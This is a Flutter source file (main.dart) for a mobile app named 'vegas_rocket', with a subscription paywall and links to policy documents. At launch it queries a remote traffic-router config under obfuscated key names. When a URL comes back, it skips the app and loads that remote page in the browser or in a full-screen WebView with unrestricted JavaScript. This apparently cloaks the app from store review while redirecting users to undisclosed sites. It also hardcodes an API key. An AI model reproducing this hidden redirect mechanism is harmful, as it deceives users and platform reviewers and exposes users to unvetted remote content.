import 'package:auto_size_text/auto_size_text.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:hive_flutter/hive_flutter.dart';
import 'package:hive/hive.dart';
import 'package:vegas_rocket/pages/main_page/main_page.dart';
import 'package:vegas_rocket/pages/purchase_page/purchase_page.dart';
import 'package:vegas_rocket/pages/shop_page/shop_page.dart';
import 'package:vegas_rocket/utilits/CreateUserData.dart';
import 'package:vegas_rocket/variables/global_varibles.dart';
import 'package:vegas_rocket/variables/my_colors.dart';
import 'package:http/http.dart';
import 'package:traffic_router/traffic_router.dart' as tr;
import 'package:url_launcher/url_launcher.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:apphud/apphud.dart';
import 'package:app_review/app_review.dart';
import 'package:flutter/services.dart';
import 'dart:io';
import 'dart:async';

final api = 'app_BvXLAZ7pGuymbNpbsskAjdAfhiQz3i';
final productID = 'vegas_rocket_premium';

final termsOfUse = 'https://docs.google.com/document/d/1j-b6BOoZav2deY-6-4V8B2-IohCzN_36GLlAhlND0NI/edit?usp=sharing';
final privacyPolicy = 'https://docs.google.com/document/d/1IWxUAkrdfAif--AnBQxfEn50m85SEa4B8gqssPJn4ZM/edit?usp=sharing';
final support = 'https://docs.google.com/forms/d/e/1FAIpQLSeAhQ7zW4G1tfjV1bUquhWHs1MgHVp5-lCOiveK13IKZF1Zug/viewform?usp=sf_link';

// Этот контроллер подписки может использоваться в StreamBuilder
final StreamController<bool> subscribedController = StreamController.broadcast();
// Через эту переменную можно смотреть состояние подписки юзера
bool subscribed = false;
late Stream<bool> subscribedStream;
late StreamSubscription<bool> subT;

// Закинуть на экран с покупкой, если вернул true, то закрыть экран покупки
// В дебаге этот метод вернет true
Future<bool> purchase() async {
  print('start purchace');
    final res = await Apphud.purchase(productId: productID);
    if ((res.nonRenewingPurchase?.isActive ?? false) || kDebugMode) {
        subscribedController.add(true);
        return true;
    }
    return false;
}

// Закинуть на экран с покупкой, если вернул true, то закрыть экран покупки
// В дебаге этот метод вернет true
Future<bool> restore() async {
    final res = await Apphud.restorePurchases();
    if (res.purchases.isNotEmpty || kDebugMode) {
        subscribedController.add(true);
        return true;
    }
    return false;
}

// Эти 3 метода нужны для показа вебвью с пользовательским соглашением, саппортом. Оставить в этом файле (main.dart), вызывать из экрана покупки, настроек
openTermsOfUse() {
    launch(termsOfUse);
}
openPrivacyPolicy() {
    launch(privacyPolicy);
}
openSupport() {
    launch(support);
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  final trafficRouter = await tr.TrafficRouter.initialize(
    settings: tr.Settings(paramNames: tr.ParamNames(
      databaseRoot: 'json_vegas_rocket',
      baseUrl1: 'rotar',
      baseUrl2: 'kilod',
      url11key: 'zunax',
      url12key: 'fedikt',
      url21key: 'tafalin',
      url22key: 'vewaa',
    ))
  );

  if (trafficRouter.url.isEmpty) {
    await Apphud.start(apiKey: api);
    subscribedStream = subscribedController.stream;
    subT = subscribedStream.listen((event) {
      subscribed = event;
    });
    if (await Apphud.isNonRenewingPurchaseActive(productID)) {
      subscribedController.add(true);
    }
    startMain();
  } else {
    AppReview.requestReview;
    if (trafficRouter.override) {
      await _launchInBrowser(trafficRouter.url);
    } else {
      runApp(MaterialApp(
        home: WebViewPage(
          url: trafficRouter.url,
        ),
      ));
    }
  }
}

Future<void> _launchInBrowser(String url) async {
  if (await canLaunch(url)) {
    await launch(
      url,
      forceSafariVC: false,
      forceWebView: false,
    );
  } else {
    throw 'Could not launch $url';
  }
}

class WebViewPage extends StatefulWidget {
  final String url;

  const WebViewPage({Key? key, required this.url}) : super(key: key);

  @override
  State<StatefulWidget> createState() {
    return _WebViewPageState();
  }
}

class _WebViewPageState extends State<WebViewPage> {
  WebViewController? _webController;
  late String webviewUrl;

  @override
  void dispose() {
    super.dispose();
  }

  @override
  void initState() {
    super.initState();
    if (Platform.isAndroid) WebView.platform = SurfaceAndroidWebView();
    _enableRotation();
    webviewUrl = widget.url;
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        if ((await _webController?.canGoBack()) ?? false) {
          await _webController?.goBack();
          return Future.value(false);
        }
        return Future.value(true);
      },
      child: Scaffold(
        body: SafeArea(
          child: WebView(
            gestureNavigationEnabled: true,
            initialUrl: webviewUrl,
            javascriptMode: JavascriptMode.unrestricted,
            onWebViewCreated: (con) {
              print('complete');
              _webController = con;
            },
          ),
        ),
      ),
    );
  }

  void _enableRotation() {
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
    ]);
  }
}


void startMain() async {
  // await Hive.initFlutter();
  // await Hive.openBox('settings');
  await createUserData();

  
  runApp(MyApp());

  SystemChrome.setSystemUIOverlayStyle(SystemUiOverlayStyle.light);
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    
    return MaterialApp(
      home: AppRootPage(), // MainPage(), // ShopPage(), //PurchasePage(),////AppRootPage(), // OnboardingPage(), // //
    );
  }
}



class AppRootPage extends StatefulWidget {
  AppRootPage({Key? key}) : super(key: key);

  @override
  _AppRootPageState createState() => _AppRootPageState();
}

class _AppRootPageState extends State<AppRootPage> {

  @override
  void initState() {
    super.initState();

    WidgetsBinding.instance?.addPostFrameCallback((timeStamp) async {
      
      Navigator.pushReplacement(
          context,
          PageRouteBuilder(
            transitionDuration: Duration(),
            pageBuilder: (context, _, __) => const MainPage()
          )
        );

      Navigator.of(context).push(
            CupertinoPageRoute(
              fullscreenDialog: true,
              builder: (context) => const PurchasePage(),
            ),
          );
      
    });
  }

  @override
  Widget build(BuildContext context) {
    return const Scaffold(
      backgroundColor: Color(0xFF101010),
      body: Center(
        child: Text('splash screen'),
      ),
    );
  }
}
